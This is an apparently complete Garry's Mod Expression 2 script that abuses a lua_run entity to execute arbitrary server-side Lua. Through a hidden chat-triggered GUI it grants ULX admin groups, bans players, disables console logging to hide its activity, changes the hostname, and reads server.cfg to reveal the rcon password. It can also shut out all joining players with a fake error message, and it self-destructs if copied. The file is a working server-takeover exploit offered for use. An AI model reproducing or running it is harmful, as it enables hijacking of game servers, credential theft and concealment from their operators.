@name :D
@persist [ Owner Choise Eject ]:entity Players:array
 
interval( 1 )
if( first() )
{
Owner = owner()
Owner:giveWeapon( "lua_run" )
 
Eject = entitySpawn( "func_button", 1 )
Eject:setFire( "addoutput", "onpressed lua_run:RunPassedCode:RunString( Entity( "+entity():id()+" ).e2data[ 'lua' ][ 1 ] )", 0 )
 
dPanel( "gui", vec2(), vec2( 200, 300 ) )
dShowCloseButton( "gui", 0 )
dColor( "gui", 0, 0, 0, 255 )
 
dButton( "close", "gui", vec2( 178, 2 ), vec2( 20 ) )
dText( "close", "_" )
 
dImage( "check", "gui", "color", vec2( 159, 3 ), vec2( 18 ) )
if( findByClass( "lua_run" ) )
{
dColor( "check", 0, 255, 0, 255 )
}
else
{
dColor( "check", 255, 0, 0, 255 )
}
 
dImage( "lock", "gui", "vgui/servers/icon_password_column", vec2( 139, 3 ), vec2( 18 ) )
dColor( "lock", 0, 255, 0, 255 )
 
dButton( "logecho", "gui", vec2( 2, 278 ), vec2( 196, 20 ) )
dText( "logecho", "disable logecho" )
 
dListBox( "players", "gui", vec2( 2, 25 ), vec2( 196, 150 ) )
function updatePList()
{
foreach( K, V:entity = players() )
{
Players[ K, string ] = V:name()
}
dArray( "players", Players )
}
dDropBox( "groups", "gui", vec2( 2, 175 ), 196 )
dArray( "groups", array( "user", "coder", "operator", "admin","Friend","Premium","ExtraVip","Minge","E2 Coder Master","superadmin", "builder","user_1","user_2", "VIP", "owner", "E2Coder", "Igrok", "Helpers", "Helper" ) )
foreach( K, V:string = array( "players", "groups", "entry", "hostname" ) )
{
dRunOnChange( V, 1 )
}
dButton( "ban", "gui", vec2( 2, 195 ), vec2( 196, 20 ) )
dButton( "unban", "gui", vec2( 100, 215 ), vec2( 98, 20 ) )
dTextBox( "steamid", "gui", vec2( 2, 215 ), 98 )
 
dTextBox( "hostname_entry", "gui", vec2( 2, 235 ), 98 )
dSetSval( "hostname_entry", hostname() )
dButton( "hostname", "gui", vec2( 100, 235 ), vec2( 98, 20 ) )
 
 
dTextBox( "rcon_entry", "gui", vec2( 2, 255 ), 98 )
dButton( "rcon", "gui", vec2( 100, 255 ), vec2( 98, 20 ) )
 
function eject( String:string )
{
entity():setVar( "lua", String )
Eject:setFire( "Press", "", 0 )
}
runOnChat( 1 )
}
if( changed( players():count() ) )
{
updatePList()
}
if( changed( dSval( "players" ) ) )
{
Choise = findPlayerByName( dSval( "players" ) )
dSetSval( "groups", Choise:getUserGroup() )
}
elseif( changed( dSval( "groups" ) ) & Choise:isValid() )
{
if( dSval( "groups" ) != "user" )
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
RunConsoleCommand('ulx','adduser','" + Choise:name() + "','" + dSval( "groups" ) + "')
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
else
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
RunConsoleCommand('ulx','removeuser','" + Choise:name() + "')
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
}
if( dClk( "ban" ) )
{
if( Choise:isValid() & Choise != Owner )
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
for k, v in pairs( player.GetAll() ) do
if v:SteamID() == '" + Choise:steamID() + "' then
RunConsoleCommand('ulx','banid','" + Choise:steamID() + "','0','Bad challenge.')
end
end
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
}
elseif( dClk( "unban" ) )
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
RunConsoleCommand('ulx','unban','" + dSval( "steamid" ) + "')
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
elseif( dClk( "logecho" ) )
{
if( dSval( "logecho" ):find( "disable" ) )
{
dText( "logecho", "enable logecho" )
eject( "
hook.Add( 'Think', 'SWAGGY', function()
MsgN( '[gui] ULX Console log is disabled.' )
RunConsoleCommand('ulx','logecho','0')
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
elseif( dSval( "logecho" ):find( "enable" ) )
{
dText( "logecho", "disable logecho" )
eject( "
hook.Add( 'Think', 'SWAGGY', function()
MsgN( '[gui] ULX Console log is enabled.' )
RunConsoleCommand('ulx','logecho','2')
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
}
elseif( dClk( "hostname" ) )
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
RunConsoleCommand('hostname','" + dSval( "hostname_entry" ) + "')
Entity( " +
Owner:id() + " ):ChatPrint( 'New server name: ' .. '" + dSval( "hostname_entry" ) + "' )
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
elseif( dClk( "rcon" ) )
{
eject( "
hook.Add( 'Think', 'SWAGGY', function()
local fasdasd = tostring( file.Read( 'cfg/server.cfg', 'GAME' ) )
local explode = string.Explode( ' ', fasdasd )
for k, v in pairs( explode ) do
if string.find( v, 'rcon_password' ) then
Entity( " + Owner:id() + " ):ChatPrint( 'Rcon password = ' .. explode[ k + 1 ] )
end
end
hook.Remove( 'Think', 'SWAGGY' )
end )" )
}
elseif( dClk( "Close" ) )
{
dShow( "Gui", 0 )
}
if( chatClk( Owner ) )
{
if( Owner:lastSaid():find( "!gui" ) )
{
dShow( "Gui", 1 )
}
local Explode = Owner:lastSaid():explode( "a." )
if( Owner:lastSaid():find( "a." ) )
{
hideChat( 1 )
if( Explode:string( 2 ) == "lock" )
{
dColor( "lock", 255, 0, 0, 255 )
eject( "
hook.Add( 'CheckPassword', 'SWAGGY', function( id64, ip, svp, clp, name )
Entity( " + Owner:id() + " ):ChatPrint( name .. ' tried to connect from ' .. ip )
return false, 'Connection failed at first entry...\nNo internet connection.'
end )" )
}
elseif( Explode:string( 2 ) == "unlock" )
{
dColor( "lock", 0, 255, 0, 255 )
eject( "
hook.Remove( 'CheckPassword', 'SWAGGY' )
" )
}
}
}
if( duped() ){ selfDestruct() }